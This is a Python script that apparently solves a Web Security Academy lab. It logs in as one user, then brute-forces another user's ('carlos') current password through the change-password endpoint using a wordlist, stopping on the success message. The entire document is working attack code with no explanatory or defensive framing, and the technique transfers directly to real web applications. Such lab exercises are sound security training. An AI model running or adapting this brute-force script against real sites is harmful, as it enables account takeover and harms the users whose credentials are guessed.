import requests

url_change_password = 'https://0af1004704f0331281781b9300f6004b.web-security-academy.net/my-account/change-password'
url_login = 'https://0af1004704f0331281781b9300f6004b.web-security-academy.net/login'

with open('../wordlists/burp_passwords.txt', 'r') as file:
    passwords = [line.strip() for line in file if line.strip()]

index = 0
total_passwords = len(passwords)

# Use a session to manage cookies and persist certain parameters across requests
session = requests.Session()

while index < total_passwords:
    if index < total_passwords:
        password = passwords[index]
        index += 1
    else:
        break

    # Log in with the given username and password
    login_data = {'username': 'wiener', 'password': 'peter'}
    response3 = session.post(url=url_login, data=login_data)

    # Now that we are logged in, attempt to change the password
    change_password_data = {
        'username': 'carlos',
        'current-password': password,
        'new-password-1': 'asd',
        'new-password-2': 'asd'
    }
    response1 = session.post(url_change_password, data=change_password_data, allow_redirects=False)
    print(f"Attempting password '{password}' for 'carlos': {response1.status_code}")

    if 'Password changed successfully!' in response1.text:
        print(f"Successful password for 'carlos': {password}")
        break

    # Print response for debugging
    print(response1.text)
